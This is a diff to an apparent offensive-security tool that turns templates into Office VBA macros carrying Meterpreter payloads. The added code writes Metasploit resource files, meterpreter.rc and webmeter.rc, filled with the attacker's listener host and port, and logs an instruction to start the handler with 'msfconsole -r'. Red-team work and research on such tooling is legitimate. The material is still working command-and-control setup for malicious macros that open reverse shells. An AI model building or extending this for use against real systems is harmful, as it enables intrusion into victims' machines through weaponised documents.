@@ -231,6 +231,18 @@ class TemplateToVba(MpModule):
             content = content + vbLib.Meterpreter.VBA
         vbaFile = self.addVBAModule(content)
         logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
+        rc_content = vbLib.templates.METERPRETER_RC
+        rc_content = rc_content.replace("<<<LHOST>>>", paramDict["rhost"])
+        rc_content = rc_content.replace("<<<LPORT>>>", paramDict["rport"])
+        # Write in RC file
+        rcFilePath = os.path.join(os.path.dirname(self.outputFilePath), "meterpreter.rc")
+        f = open(rcFilePath, 'w')
+        f.writelines(rc_content)
+        f.close()
+        logging.info("   [-] Meterpreter resource file generated in %s" % (rcFilePath)) 
+        logging.info("   [-] Execute lisetener with 'msfconsole -r %s'" % (rcFilePath)) 
+        
+        
         
  
     def _processWebMeterTemplate(self):
@@ -247,6 +259,17 @@ class TemplateToVba(MpModule):
 
         vbaFile = self.addVBAModule(content)
         logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
+        
+        rc_content = vbLib.templates.WEBMETER_RC
+        rc_content = rc_content.replace("<<<LHOST>>>", paramDict["rhost"])
+        rc_content = rc_content.replace("<<<LPORT>>>", paramDict["rport"])
+        # Write in RC file
+        rcFilePath = os.path.join(os.path.dirname(self.outputFilePath), "webmeter.rc")
+        f = open(rcFilePath, 'w')
+        f.writelines(rc_content)
+        f.close()
+        logging.info("   [-] Meterpreter resource file generated in %s" % (rcFilePath)) 
+        logging.info("   [-] Execute lisetener with 'msfconsole -r %s'" % (rcFilePath)) 
         
         
  
